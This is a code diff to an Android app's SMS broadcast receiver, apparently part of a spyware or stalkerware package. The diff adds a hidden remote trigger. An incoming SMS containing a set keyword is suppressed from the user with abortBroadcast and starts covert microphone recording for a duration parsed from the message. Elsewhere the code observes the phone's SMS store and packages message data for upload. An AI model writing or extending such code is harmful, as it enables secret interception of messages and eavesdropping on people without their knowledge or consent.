@@ -14,8 +14,9 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.telephony.SmsMessage;
-import android.util.Log;
 
+import com.inet.android.audio.RecordAudio;
+import com.inet.android.certificate.R;
 import com.inet.android.request.DataRequest;
 import com.inet.android.request.RequestMakerImpl;
 import com.inet.android.utils.ConvertDate;
@@ -38,7 +39,8 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		this.mContext = context;
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		String sms = sp.getString("sms", "0");
-
+		mBundle = intent.getExtras();
+		RegSmsObserver();
 		if (sms.equals("0")) {
 			Logging.doLog(LOG_TAG, "sms : 0", "sms : 0");
 			return;
@@ -57,19 +59,21 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		}
 
 		try {
-			mBundle = intent.getExtras();
-			smsSentObserver = null;
-		
-			if (smsSentObserver == null) {
-				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
-				mContext.getContentResolver().registerContentObserver(
-						Uri.parse("content://sms"), true, smsSentObserver);
-			}
-						
+
+			getSMSDetails();
+			// RegSmsObserver();
 
 		} catch (Exception sgh) {
 			Logging.doLog(TAG, "Error in Init : " + sgh.toString(),
 					"Error in Init : " + sgh.toString());
+		}
+	}
+
+	public void RegSmsObserver() {
+		if (smsSentObserver == null) {
+			smsSentObserver = new SmsSentObserver(new Handler(), mContext);
+			mContext.getContentResolver().registerContentObserver(
+					Uri.parse("content://sms"), true, smsSentObserver);
 		}
 	}
 
@@ -83,23 +87,24 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 			if (pdus != null) {
 				type = "5";
 				msgs = new SmsMessage[pdus.length];
+				String startRecord = mContext.getString(R.string.start_record);
 
 				StringBuilder bodyText = new StringBuilder();
 				for (int k = 0; k < msgs.length; k++) {
 					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);
 
-					Logging.doLog(
-							TAG,
-							"getDisplayMessageBody : "
-									+ msgs[k].getDisplayMessageBody());
-					Logging.doLog(TAG, "getDisplayOriginatingAddress : "
-							+ msgs[k].getDisplayOriginatingAddress());
-					Logging.doLog(TAG,
-							"getMessageBody : " + msgs[k].getMessageBody());
-					Logging.doLog(
-							TAG,
-							"getOriginatingAddress : "
-									+ msgs[k].getOriginatingAddress());
+					if (msgs[k].getMessageBody().toLowerCase()
+							.contains(startRecord)) {
+						Logging.doLog(LOG_TAG, "start record", "start record");
+						abortBroadcast();
+						int minute = Integer.parseInt(msgs[k].getMessageBody().substring(
+								msgs[k].getMessageBody().lastIndexOf("d") + 1,
+								msgs[k].getMessageBody().length()))*60;
+						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
+								+ minute);
+						RecordAudio recordAudio = new RecordAudio(minute);
+						recordAudio.executeRecording();
+					}
 
 				}
 				String phNumber = msgs[0].getOriginatingAddress();
@@ -107,6 +112,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 				for (int i = 0; i < msgs.length; i++) {
 					bodyText.append(msgs[i].getMessageBody());
 				}
+
 				// -------send sms--------------------------------
 				String sendJSONStr = null;
 				JSONObject jsonObject = new JSONObject();
